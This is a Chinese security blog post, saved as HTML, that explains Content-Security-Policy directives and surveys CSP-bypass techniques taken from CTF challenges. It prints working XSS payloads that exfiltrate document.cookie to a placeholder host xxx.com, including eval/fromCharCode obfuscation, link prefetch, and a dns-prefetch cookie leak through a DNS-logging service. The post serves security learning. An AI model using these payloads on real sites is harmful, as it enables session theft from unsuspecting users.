@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      那些年我们绕过的CSP | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下 What is CSP? The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to loa">
+<meta name="keywords" content="XSS,CSP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="那些年我们绕过的CSP | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/03/03/那些年我们绕过的CSP/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下 What is CSP? The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to loa">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="那些年我们绕过的CSP | HeartSky&#39;s blog">
+<meta name="twitter:description" content="最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下 What is CSP? The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to loa">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">那些年我们绕过的CSP</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-03" class="post-meta__date date">2017-03-03</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CSP/">CSP</a>, <a class="tags-link" href="/tags/XSS/">XSS</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下</p>
+<h3 id="What-is-CSP"><a href="#What-is-CSP" class="headerlink" title="What is CSP?"></a>What is CSP?</h3><blockquote>
+<p>The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to load via a HTTP Header.</p>
+</blockquote>
+<p>CSP(Content Security Policy) 在 HTTP 响应头中规定，用来减少 XSS 攻击。在 HTTP 响应中长这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; cdn.example.com;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Directive-Reference-指令参考"><a href="#Directive-Reference-指令参考" class="headerlink" title="Directive Reference(指令参考)"></a>Directive Reference(指令参考)</h3><ul>
+<li>不同指令之间用 <code>;</code> 分隔</li>
+<li>同一指令的多个指令值之间用空格分隔</li>
+<li>指令值除了 URL 都要用引号包裹</li>
+<li>指令如果重复，则以第一个为准</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>default-src</td>
+<td>‘self’ cdn.example.com</td>
+<td>定义资源默认加载策略</td>
+</tr>
+<tr>
+<td>script-src</td>
+<td>‘self’ js.example.com</td>
+<td>定义 JS 的加载策略</td>
+</tr>
+<tr>
+<td>img-src</td>
+<td>‘self’ img.example.com</td>
+<td>定义图片的加载策略</td>
+</tr>
+<tr>
+<td>style-src</td>
+<td>‘self’ css.example.com</td>
+<td>定义样式表的加载策略</td>
+</tr>
+<tr>
+<td>font-src</td>
+<td>font.example.com</td>
+<td>定义字体的加载策略、</td>
+</tr>
+<tr>
+<td>object-src</td>
+<td>‘self’</td>
+<td>定义引用资源的加载策略，如 &lt;object&gt; &lt;embed&gt; &lt;applet&gt;等</td>
+</tr>
+<tr>
+<td>media-src</td>
+<td>media.example.com</td>
+<td>定义音频和视频的加载策略，如 HTML5 中的 &lt;audio&gt; &lt;video&gt;</td>
+</tr>
+<tr>
+<td>connect-src</td>
+<td>‘self’</td>
+<td>定义 Ajax、WebSocket 等的加载策略</td>
+</tr>
+<tr>
+<td>frame-src</td>
+<td>‘self’</td>
+<td>定义 frame 的加载策略，不赞成使用，改用 child-src</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Source-List-Reference"><a href="#Source-List-Reference" class="headerlink" title="Source List Reference"></a>Source List Reference</h3><p>所有以 -src 结尾的指令的指令值语法是相似的，我们称它为 source list</p>
+<table>
+<thead>
+<tr>
+<th>源值</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>*</td>
+<td>img-src *</td>
+<td>通配符，允许除 <font color="green">data: blob: filesystem:</font> 协议之外的任意 URL</td>
+</tr>
+<tr>
+<td>‘none’</td>
+<td>object-src ‘none’</td>
+<td>不允许加载任何资源</td>
+</tr>
+<tr>
+<td>‘self’</td>
+<td>script-src ‘self’</td>
+<td>允许加载同域(即同域名、同协议、同端口)下的资源</td>
+</tr>
+<tr>
+<td>data:</td>
+<td>img-src ‘self’ data:</td>
+<td>允许通过 data 协议加载资源，如 <font color="green">data:image/jpeg;base64,base64_encode_data</font></td>
+</tr>
+<tr>
+<td>domain.example.com</td>
+<td>img-src domain.example.com</td>
+<td>允许加载指定域名下的资源</td>
+</tr>
+<tr>
+<td>*.example.com</td>
+<td>img-src *.example.com</td>
+<td>允许加载 example.com 下所有子域名的资源</td>
+</tr>
+<tr>
+<td>‘unsafe-inline’</td>
+<td>script-src ‘unsafe-inline’</td>
+<td>允许执行内联资源，如样式属性、事件、script 标签</td>
+</tr>
+<tr>
+<td>‘unsafe-eval’</td>
+<td>script-src ‘unsafe-eval’</td>
+<td>允许不安全的动态代码执行，如 JS 中的 eval() 函数</td>
+</tr>
+<tr>
+<td><a href="https://cdn.com" target="_blank" rel="external">https://cdn.com</a></td>
+<td>img-src <a href="https://cdn.com" target="_blank" rel="external">https://cdn.com</a></td>
+<td>只允许给定域名下的通过 HTTPS 连接的资源</td>
+</tr>
+<tr>
+<td>https:</td>
+<td>img-src https:</td>
+<td>只允许通过 HTTPS 连接的资源</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Some-examples"><a href="#Some-examples" class="headerlink" title="Some examples"></a>Some examples</h3><h5 id="只允许加载同源下的任何资源"><a href="#只允许加载同源下的任何资源" class="headerlink" title="只允许加载同源下的任何资源"></a><strong>只允许加载同源下的任何资源</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;;</span><br></pre></td></tr></table></figure>
+<h5 id="允许加载谷歌分析的-JS-用来统计数据，如博客访问量-和同源下的资源"><a href="#允许加载谷歌分析的-JS-用来统计数据，如博客访问量-和同源下的资源" class="headerlink" title="允许加载谷歌分析的 JS(用来统计数据，如博客访问量)和同源下的资源"></a><strong>允许加载谷歌分析的 JS(用来统计数据，如博客访问量)和同源下的资源</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src: &apos;self&apos; www.google-analytics.com</span><br></pre></td></tr></table></figure>
+<h5 id="只允许加载同域下的图片、JS、CSS-和-Ajax-请求，其他类型的资源不允许加载"><a href="#只允许加载同域下的图片、JS、CSS-和-Ajax-请求，其他类型的资源不允许加载" class="headerlink" title="只允许加载同域下的图片、JS、CSS 和 Ajax 请求，其他类型的资源不允许加载"></a><strong>只允许加载同域下的图片、JS、CSS 和 Ajax 请求，其他类型的资源不允许加载</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Bypass-unsafe-CSP"><a href="#Bypass-unsafe-CSP" class="headerlink" title="Bypass unsafe CSP"></a>Bypass unsafe CSP</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &apos;self&apos; &apos;unsafe-inline&apos;；</span><br></pre></td></tr></table></figure>
+<p>当开启了这个选项时，意味着可以执行内联资源，包括 JS、样式表等<br>假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的 Cookie。<br>在没有过滤的条件下我们可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=http://xxx.com+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=http://xxx.com+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var i = document.createElement(&apos;img&apos;);</span><br><span class="line">i.src = &apos;http://xxx.com&apos; + document.cookie;</span><br><span class="line">document.body.appendChild(i);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>至于有过滤的情况下，为了不至于那么生硬，我们举几个真实比赛中的例子</p>
+<h5 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点"></a><strong>过滤了点</strong></h5><p>Google CTF 2016 Wallowing Wallabies - Part Three<br>过滤了所有的点，属性的点可以用 <code>[&#39;&#39;]</code> 的形式来代替，URL 我们可以用 String.fromCharCode 函数，所以最后的 payload 是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var i = document[&apos;createElement&apos;](&apos;img&apos;);</span><br><span class="line">i[&apos;src&apos;] = String[&apos;fromCharCode&apos;](http://xxx.com 所对应的 Ascii 码，用逗号分隔) + document[&apos;cookie&apos;];</span><br><span class="line">document[&apos;body&apos;][&apos;appendChild&apos;](i);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="过滤了大部分关键字"><a href="#过滤了大部分关键字" class="headerlink" title="过滤了大部分关键字"></a><strong>过滤了大部分关键字</strong></h5><p>在最近结束的 ZCTF 2017 中就碰到了这样一道题，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">)</span><br><span class="line">eval</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">href</span><br><span class="line">window</span><br><span class="line">src</span><br><span class="line">svg</span><br><span class="line">img</span><br></pre></td></tr></table></figure>
+<p>这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的 Twitter 中的一个 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;//# sourceMappingURL=https://xxx.com/?$&#123;escape(document.cookie)&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>因为我们不用获取 Cookie，所以完全可以实现我们的要求<br>PS：//# sourceMappingURL 是用来请求一个 .map 文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试</p>
+<p>还有就是这个指令值出现在 style-src 中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>比如上次 Pwnhub 蓝猫师傅出的一道题 <code>打开电脑</code>， CSP 是长这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src *; img-src * data: blob:; frame-src &apos;self&apos;; script-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-eval&apos;; style-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-inline&apos;; connect-src * wss:;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以提交一条 md5 值，后台显示方式和前段差不多，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;modal&quot; class=&quot;detail&quot; href=&quot;#detail&quot; data-toggle=&quot;modal&quot; contributor=aaangelwhu hexdata=672e65613167722e333170366572657265726572657265&gt;fffffffffffe53cdbc640fffb934cfb8&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>因为有 htmlspecialchars，对 <code>&lt;</code> <code>&quot;</code> 进行了转义，即我们跳不出这个标签，所以不能用 script 标签，但是我们注意到 hexdata 是没有引号的，而且这个字段又是我们可控的，结合 style-src 的 unsafe-inline 值，可以在标签内使用内联样式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">233 style=background-image:url(http://xxx.com)</span><br><span class="line">233 style=background:url(http://xxx.com)</span><br></pre></td></tr></table></figure></p>
+<p>background-image 属性是用来为元素设置背景图像的</p>
+<h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;</span><br></pre></td></tr></table></figure>
+<p>当上面的 unsafe-inline 和 unsafe-eval 都开启时，将会变得很危险<br>因为你过滤的一些关键字都可以用 eval 函数来绕过，比如<br>我们先对最基本的 payload 用 String.fromCharCode 函数来处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.location=http://xxx.com+document.cookie</span><br><span class="line">String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101)</span><br></pre></td></tr></table></figure></p>
+<p>再用 eval 函数执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样就避开了很多关键字，当然不保证会直接过滤掉 eval</p>
+<h4 id="Link-Prefetch"><a href="#Link-Prefetch" class="headerlink" title="Link Prefetch"></a>Link Prefetch</h4><p>在 HTML5 中有一个新特性，<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ" target="_blank" rel="external">Link Prefetch</a>(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度<br>官方的定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link prefetching is a browser mechanism, which utilizes browser idle time to download or prefetch documents that the user might visit in the near future. A web page provides a set of prefetching hints to the browser, and after the browser is finished loading the page, it begins silently prefetching specified documents and stores them in its cache. When the user visits one of the prefetched documents, it can be served up quickly out of the browser&apos;s cache.</span><br></pre></td></tr></table></figure></p>
+<p>下面就说下几种可以实现预加载的方式</p>
+<h5 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a><strong>prefetch</strong></h5><p>一般是通过 link 标签来实现预加载的指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var i=document.createElement(&apos;link&apos;);</span><br><span class="line">	i.setAttribute(&apos;rel&apos;,&apos;prefetch&apos;);</span><br><span class="line">	i.setAttribute(&apos;href&apos;,&apos;http://xxx.com?&apos;+document.cookie);</span><br><span class="line">	document.head.appendChild(i);	</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="dns-prefetch"><a href="#dns-prefetch" class="headerlink" title="dns-prefetch"></a><strong>dns-prefetch</strong></h5><p>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>同样想要在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>这种情况下收获 Cookie 的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    dcl = document.cookie.split(&quot;;&quot;);</span><br><span class="line">    n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0];</span><br><span class="line"></span><br><span class="line">    for (var i=0; i&lt;dcl.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(dcl[i]);</span><br><span class="line">        n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot; + escape(dcl[i].replace(/\//g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/\./g, &quot;-&quot;) +  &quot;.wb7g7z.ceye.io\&quot;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换</p>
+<p>然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个<a href="http://ceye.io" target="_blank" rel="external">平台</a></p>
+<h5 id="preconnect"><a href="#preconnect" class="headerlink" title="preconnect"></a><strong>preconnect</strong></h5><p>preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商</p>
+<p>利用方式和上面类似</p>
+<h5 id="preload"><a href="#preload" class="headerlink" title="preload"></a><strong>preload</strong></h5><p>preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源</p>
+<p>和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; connect-src *;</span><br></pre></td></tr></table></figure></p>
+<p>然后就是和上面类似的 payload 了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preload"</span> <span class="attr">href</span>=<span class="string">http://xxx.com</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="prerender"><a href="#prerender" class="headerlink" title="prerender"></a><strong>prerender</strong></h5><p>测试了下好像已经不行了，没有 CSP 头也不行</p>
+<h4 id="302-Redirect-Bypass"><a href="#302-Redirect-Bypass" class="headerlink" title="302 Redirect Bypass"></a>302 Redirect Bypass</h4><p>很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接<br>在 PHP 中一般这样来实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">'Location: http://xxx.com'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>我们看下官方的<a href="https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects" target="_blank" rel="external">说明</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4.2.2.3. Paths and Redirects</span><br><span class="line"></span><br><span class="line">To avoid leaking path information cross-origin (as discussed in Egor Homakov’s Using Content-Security-Policy for Evil), the matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect. For example, given a page with an active policy of img-src example.com not-example.com/path:</span><br><span class="line"></span><br><span class="line">Directly loading https://not-example.com/not-path would fail, as it doesn’t match the policy.</span><br><span class="line">Directly loading https://example.com/redirector would pass, as it matches example.com.</span><br><span class="line">Assuming that https://example.com/redirector delivered a redirect response pointing to https://not-example.com/not-path, the load would succeed, as the initial URL matches example.com, and the redirect target matches not-example.com/path if we ignore its path component.</span><br></pre></td></tr></table></figure></p>
+<p>也就是说只要产生跳转的页面在 CSP 下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的</p>
+<p>参考链接: <a href="https://xianzhi.aliyun.com/forum/read/523.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/523.html</a></p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
